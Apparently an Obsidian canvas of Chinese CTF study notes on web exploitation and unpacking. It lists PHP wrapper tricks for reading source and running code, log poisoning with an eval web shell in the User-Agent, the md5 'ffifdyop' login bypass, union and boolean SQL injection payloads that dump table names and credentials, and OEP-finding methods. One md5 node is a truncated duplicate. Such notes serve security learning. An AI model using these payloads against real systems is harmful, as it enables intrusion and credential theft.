		{"id":"d1a8e5bb9d994370","type":"text","text":"# PHP伪协议\n\n## 带编码地读取文件\n```\n?file=php://filter/read=convert.base64-encode/resource=index.php\n```\n\n## 用 `php://input` 来RCE\n原理是 `php://input` 这个协议会从POST请求读取数据，而 `inlcude` 会执行 PHP 代码。\n```\n?url=php://input\n```\n然后 POST 的 body\n```\n<?php system(\"ls\"); ?>\n```","x":-2828,"y":603,"width":460,"height":550},
		{"id":"2e8e441a95e283c9","type":"text","text":"伪协议被 ban 了？","x":-2723,"y":1313,"width":250,"height":60},
		{"id":"a5f51334bf18410a","type":"text","text":"# 日志注入\n\n\n| **服务器/系统**             | **常见日志路径**                                                    |\n| ---------------------- | ------------------------------------------------------------- |\n| **Apache (Ubuntu)**    | `/var/log/apache2/access.log` 或 `error.log`                   |\n| **Apache (CentOS)**    | `/var/log/httpd/access_log`                                   |\n| **Nginx**              | `/var/log/nginx/access.log` 或 `error.log`                     |\n| **SSH (Auth)**         | `/var/log/auth.log` (尝试通过 `ssh '<?php ... ?>'@target.com` 注入) |\n| **Windows (phpStudy)** | `../phpstudy_pro/Extensions/Apache2.4.39/logs/access.log`     |\n\n## Nginx日志写入\nApache 会记录 User-Agent 和 Referer\n[[include 日志注入]]\n\n**通过 User-Agent 注入**\n```http\nGET /?url=/var/log/nginx/access.log HTTP/1.1\nHost: 8f9cf2e7-3f55-4cf2-ace4-01710766c558.challenge.ctf.show\nUser-Agent: <?php @eval($_POST['ant']);die();?>\n```","x":-2957,"y":1490,"width":718,"height":550},
		{"id":"68fb15ef09bbd328","type":"text","text":"有 `include` ？","x":-2723,"y":453,"width":250,"height":60},
		{"id":"31541e3ead504d75","type":"text","text":"# 使用PHP的 `md5(string, true)` 来编码SQL命令\n`md5(string $string, bool $binary = false): string`\n- **参数**\n    - `$string`：要计算哈希值的原始字符串（必需）。\n    - `$binary`：可选参数，默认为 `false`。\n        - `false`：返回 32 字符的十六进制数字字符串。\n        - `true`：返回原始的 16 字节二进制格式。\n- **返回值**\n    - 返回计算出的 MD5 哈希值（通常为 32 位十六进制小写字符串）。\n\n二进制格式，这意味着可能拼凑出恶意字符串\n有一个尤为著名的payload `ffifdybz`\n经过 ","x":-4040,"y":1524,"width":484,"height":640},
		{"id":"4b2cc9a84e2b8b23","type":"text","text":"# 使用PHP的 `md5(string, true)` 来编码SQL命令\n`md5(string $string, bool $binary = false): string`\n- **参数**\n    - `$string`：要计算哈希值的原始字符串（必需）。\n    - `$binary`：可选参数，默认为 `false`。\n        - `false`：返回 32 字符的十六进制数字字符串。\n        - `true`：返回原始的 16 字节二进制格式。\n- **返回值**\n    - 返回计算出的 MD5 哈希值（通常为 32 位十六进制小写字符串）。\n\n```php\n$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";\n```\n\n二进制格式，这意味着可能拼凑出恶意字符串\n有一个尤为著名的payload `ffifdyop`\n经过 `md5(string, true)` 之后将得到 `276f722736c95d99e921722cf9ed621c`\n也就是 `'or'6É]é!r,ùíb\u001c`\n\n这样子可以使得后边的条件直接成立","x":-4040,"y":1524,"width":484,"height":640},
		{"id":"6450ba2f5d59ab4d","type":"text","text":"PHP的 `md5` 和SQL组合？","x":-3923,"y":1333,"width":250,"height":60},
		{"id":"b26cff55d14464ac","type":"text","text":"尝试报错注入","x":-4447,"y":1524,"width":250,"height":60},
		{"id":"8ec1734e2aaa4b96","type":"text","text":"尝试布尔注入","x":-5387,"y":1541,"width":250,"height":60},
		{"id":"9e19877d3fb6d430","type":"text","text":"是否有回显？","x":-4847,"y":1303,"width":250,"height":60},
		{"id":"aefd0da46fb7c652","type":"text","text":"# 访问数据库内容\n\n## 查看当前数据库名\n使用 `database()` 函数。\n```sql\n1' union select 1,database(),3 #\n```\n\n## 获取所有表名\n用 `group_concat` 压成一个字符串，从 `information_schema.tables` 查询\n```sql\nunion select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #\n```\n\n## 获取表里的列名\n\n```sql\nunion select 1,group_concat(column_name),3 from information_schema.columns where table_name='<你的表名>' #\n```\n\n## 获取列里的数据\n`0x3a` 是 `:`\n```sql\nunion select 1,group_concat(username,0x3a,password),3 from users #\n```","x":-4996,"y":2341,"width":518,"height":709},
		{"id":"03ede5f3a3be0800","type":"text","text":"# 有回显\n\n## 测试 `select` 的列数\n### 用 `order by` 测试\n```sql\norder by 1 #\n```\n### 用 `union select` 测试\n```sql\nunion select 1 #\nunion select 1,2 #\nunion select 1,2,3 #\n```\n\n## 测试哪个列会回显\n让原查询失效，然后使用 `union select`\n```sql\n1' union select 1,2,3 #\n```  ","x":-4947,"y":1524,"width":420,"height":639},
		{"id":"d17d1913c0b3ed31","type":"text","text":"# 使用运算符进行布尔注入\n使用 `and` `or` `xor` 还有字符截断\n例如 \n```sql\n1 and ascii(substr(database() from 1 for 1)) = 97\n```","x":-5499,"y":1770,"width":474,"height":262},
		{"id":"a63df04fb6e64d0a","type":"file","file":"各种从数据库里获取信息的方法.md","x":-4996,"y":3130,"width":518,"height":570},
		{"id":"a0e0ba82e42a13c5","type":"text","text":"# 根据跨段指令找OEP\n`.pediy` 是外壳区块，正常程序的入口点一般指向 `.text` ，加壳程序加壳后可能会将其改到外壳部分。\n不过这样的话，他最终很可能是要跳回来的，因此可以通过跨段指令来找OEP。\n![[Pasted image 20260412154232.png]]","x":-10480,"y":1104,"width":440,"height":480},
		{"id":"9ba67c3844d16ca8","type":"text","text":"寻找OEP","x":-9936,"y":728,"width":250,"height":60},
		{"id":"ff93a31c86aafb6b","type":"text","text":"# 用内存访问断点找OEP\n手动跟踪跳转到 `.text` 的跨段指令也可以找到 OEP，但其实不必手动跟踪。可以对代码段设置内存访问断点","x":-9860,"y":1104,"width":460,"height":480},
		{"id":"d9094a86f54c2c5c","type":"text","text":"# 壳为什么要保存寄存器的状态？\n当 Windows 加载一个程序时，它并不是把所有寄存器都清零。相反，某些寄存器会被赋予特定的含义。例如：\n- **`EAX`**：通常指向程序的入口点（OEP）。\n- **`EBX`**：在某些 Windows 版本或加载方式下，指向进程环境块（PEB）。\n- **`ESP` 和 `EBP`**：最重要的栈指针。它们决定了程序运行时的栈顶和基址。\n- **其他寄存器**：虽然大部分寄存器在程序启动瞬间可能是随机的或不重要的，但你无法保证编译器生成的初始化代码是否会利用这些“初始值”。\n### 2. “壳”也是一个程序，它会“弄脏”寄存器\n壳程序（Packer）本身就是一段复杂的汇编代码。在它完成解压、解密、修复输入表等任务的过程中，它必须疯狂地使用寄存器：\n- 用 `ECX` 做计数器进行循环。\n- 用 `ESI` 和 `EDI` 进行内存数据的拷贝（解压）。\n- 用 `EAX` 接收 API 函数的返回值。","x":-9400,"y":224,"width":460,"height":670},
		{"id":"6deeae418166bea4","type":"text","text":"# 根据栈平衡原理找OEP","x":-9295,"y":1104,"width":515,"height":480},
		{"id":"6175bc5a4a6c322d","type":"text","text":"脱壳","x":-9936,"y":334,"width":250,"height":60},
